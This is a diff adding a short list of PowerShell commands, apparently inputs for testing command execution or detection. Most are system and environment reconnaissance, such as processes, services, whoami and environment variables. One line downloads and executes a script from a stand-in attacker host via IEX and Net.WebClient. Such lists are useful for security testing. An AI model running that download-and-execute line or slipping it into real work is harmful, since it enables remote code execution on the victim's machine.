@@ -1,0 +1,10 @@
+Get-Process
+Get-Service
+Get-WmiObject Win32_ComputerSystem
+Get-Content C:\Windows\win.ini
+Invoke-Expression "whoami"
+IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
+$env:USERNAME
+Get-ChildItem Env:
+Test-Connection 127.0.0.1 -Count 5
+Start-Sleep -Seconds 5
